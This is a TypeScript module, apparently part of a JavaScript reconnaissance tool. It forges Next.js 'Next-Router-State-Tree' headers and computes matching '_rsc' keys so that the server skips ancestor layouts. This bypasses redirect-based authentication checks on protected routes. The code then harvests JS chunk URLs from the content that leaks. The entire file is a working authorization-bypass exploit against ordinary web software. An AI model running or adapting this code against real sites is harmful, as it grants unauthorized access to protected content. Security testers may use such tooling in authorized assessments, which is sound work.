import { createHash } from "node:crypto";
import rawRequest from "../../exploit/utility/rawRequest.js";
import { runWithConcurrency } from "../../utility/concurrency.js";
import { printMsg, MSG } from "../../utility/printMsg.js";

/** Marker Next.js embeds in a Flight payload when a layout/page calls redirect(). */
const NEXT_REDIRECT_MARKER = "NEXT_REDIRECT";

export type LeafMode = "page" | "metadata-only";

/**
 * Builds the `Next-Router-State-Tree` header value: a URL-encoded FlightRouterState
 * claiming every segment in `ancestorSegments` is already client-rendered, with the
 * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
 * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
 * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`.
 */
export const buildStateTreeHeader = (ancestorSegments: string[], leafMode: LeafMode = "page"): string => {
    let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
    for (let i = ancestorSegments.length - 1; i >= 0; i--) {
        node = [ancestorSegments[i], { children: node }];
    }
    const tree = ["", { children: node }];
    return encodeURIComponent(JSON.stringify(tree));
};

/**
 * Strong `_rsc` cache-busting key: SHA-256 of the four cache-busting inputs, truncated to
 * 96 bits and base64url-encoded. Mirrors `computeCacheBustingSearchParam` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` — not a secret, any client can
 * compute it from headers it itself sends.
 */
export const computeStrongRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    const digest = createHash("sha256").update(input).digest();
    return digest.subarray(0, 12).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

/** Ancestor-segment claims worth trying per candidate path: first segment only, and every segment but the leaf. */
export const buildAncestorAttempts = (pathSegments: string[]): string[][] => {
    if (pathSegments.length === 0) return [];
    const attempts: string[][] = [[pathSegments[0]]];
    const allButLeaf = pathSegments.slice(0, -1);
    if (allButLeaf.length > 0 && allButLeaf.join("/") !== attempts[0].join("/")) {
        attempts.push(allButLeaf);
    }
    return attempts;
};

/** True when a Flight/RSC payload records a server-side redirect (the auth check actually ran). */
export const containsNextRedirectMarker = (body: string): boolean => body.includes(NEXT_REDIRECT_MARKER);

/** Extracts `_next/static/chunks/*.js` (including Turbopack `~`-separated names) references from a Flight payload body. */
export const extractChunkPathsFromFlightBody = (body: string): string[] => {
    const matches = body.matchAll(/\/?_next\/static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
    return [...new Set([...matches].map((m) => m[0]))];
};

export interface RouterStateForgeResult {
    /** Page URLs where a forged ancestor claim returned content without a NEXT_REDIRECT marker. */
    bypassedUrls: string[];
    /** New downloadable JS chunk URLs recovered from bypassed Flight payloads. */
    newJsUrls: string[];
}

const REQUEST_TIMEOUT_MS = 15000;

/**
 * For each candidate page URL that redirects an unauthenticated request, retries as an
 * RSC fetch with a forged `Next-Router-State-Tree` claiming known ancestor segments are
 * already mounted. If Next.js skips re-executing that ancestor's layout component (see
 * js-recon-internal-docs#142), the response comes back 200 without a NEXT_REDIRECT
 * record — content a plain crawl would never see.
 */
const next_routerStateForge = async (
    candidateUrls: string[],
    threads: number,
    timeout: number = REQUEST_TIMEOUT_MS
): Promise<RouterStateForgeResult> => {
    const bypassedUrls: string[] = [];
    const newJsUrls: string[] = [];

    await runWithConcurrency(candidateUrls, threads, async (candidateUrl) => {
        let parsed: URL;
        try {
            parsed = new URL(candidateUrl);
        } catch {
            return;
        }
        const segments = parsed.pathname.split("/").filter(Boolean);
        if (segments.length === 0) return;

        // Only worth forging against routes that actually redirect an unauthenticated request.
        const baseline = await rawRequest(candidateUrl, { timeout });
        if (!baseline || baseline.status < 300 || baseline.status >= 400) return;

        for (const ancestors of buildAncestorAttempts(segments)) {
            const stateTree = buildStateTreeHeader(ancestors, "page");
            const nextUrl = "/" + ancestors.join("/");
            const rscKey = computeStrongRscKey(stateTree, nextUrl);

            const forgedUrl = new URL(candidateUrl);
            forgedUrl.searchParams.set("_rsc", rscKey);

            const forged = await rawRequest(forgedUrl.toString(), {
                timeout,
                headers: {
                    RSC: "1",
                    "Next-Router-State-Tree": stateTree,
                    "Next-Url": nextUrl,
                },
            });
            if (!forged) continue;

            const contentType = forged.headers["content-type"] ?? "";
            if (
                forged.status === 200 &&
                contentType.includes("text/x-component") &&
                !containsNextRedirectMarker(forged.body)
            ) {
                printMsg(
                    MSG.Run,
                    `[✓] Forged next-router-state-tree bypass revealed content: ${candidateUrl} (claimed ancestor: /${ancestors.join("/")})`
                );
                bypassedUrls.push(candidateUrl);
                for (const chunkPath of extractChunkPathsFromFlightBody(forged.body)) {
                    newJsUrls.push(
                        new URL(chunkPath.startsWith("/") ? chunkPath : `/${chunkPath}`, parsed.origin).toString()
                    );
                }
                break; // one successful ancestor claim per candidate is enough
            }
        }
    });

    return {
        bypassedUrls: [...new Set(bypassedUrls)],
        newJsUrls: [...new Set(newJsUrls)],
    };
};

export default next_routerStateForge;
